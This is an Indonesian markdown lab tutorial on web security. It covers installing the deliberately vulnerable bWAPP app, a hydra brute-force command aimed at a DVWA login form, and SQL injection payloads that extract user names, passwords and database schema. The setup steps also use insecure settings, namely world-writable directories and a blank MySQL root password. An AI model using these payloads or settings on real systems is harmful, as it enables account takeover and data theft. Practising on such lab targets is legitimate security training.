# Keamanan Web
> Disusun oleh Hardiyanto

### Daftar Isi
* [Burp Suite](https://gitlab.com/dwiHard/LinuxAdministration/-/edit/master/webserver/KeamananWeb.md#burp-suite)
    * [Install bWapp](https://gitlab.com/dwiHard/LinuxAdministration/-/edit/master/webserver/KeamananWeb.md#install-bwapp)
    * [BruteForce](https://gitlab.com/dwiHard/LinuxAdministration/-/edit/master/webserver/KeamananWeb.md#bruteforce)
    * [SQL Injection](https://gitlab.com/dwiHard/LinuxAdministration/-/edit/master/webserver/KeamananWeb.md#sql-injection)


## Burp Suite

### Install bWapp
1. Download file [di sini](https://sourceforge.net/projects/bwapp/files/bWAPP/)
2. Extrak file
3. pidahkan file di /var/www/html untuk pengguna linux dan untuk pengguna windows di pindah di htdocs
4. Selanjutnya ketikkan **sudo chmod 755 -R bWAPP_latest**
5. Arahkan path **/var/www/html/bWAPP_latest/bWAPP**
6. Untuk selanjutnya **sudo chmod 777 password/ images/ documents/ logs/**
7. Kemudian edit admin/setting.php sesuikan dengan laptop Anda
```
$db_server = "localhost"; 	// your database server (IP/name), here 'localhost'
$db_username = "root";		// your MySQL user, here 'root'
$db_password = "";		// your MySQL password, here 'blank'
```
8. Buka browser ketikan pada url ```http://localhost/bWAPP_latest/bWAPP/install.php```
9. Lalu klik pada Click here to install bWAPP.
10. Lalu ketik url ```http://localhost/bWAPP_latest/bWAPP/login.php```

### BruteForce
```
hydra 192.168.xx.x -l admin -P /home/hard/Documents/password.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect. :H-Cookie: security=low; PHPSESSID=xxxxxxxxxxxxxxxxxxxxxx"
```

### SQL Injection
```
1' OR 1=1#
1' OR 1=1 union all select system_user(),user()#
1' OR 1=1 union select null,schema_name from information_schema.schemata#
1' OR 1=1  union select null,table_name from information_schema.tables#
1' OR 1=1 union select null,@@datadir #
1' OR 1=1 union select null,concat(first_name,0x0a,password) from users #
1' UNION SELECT database(),2-- -
1' UNION SELECT user,password from users#
```

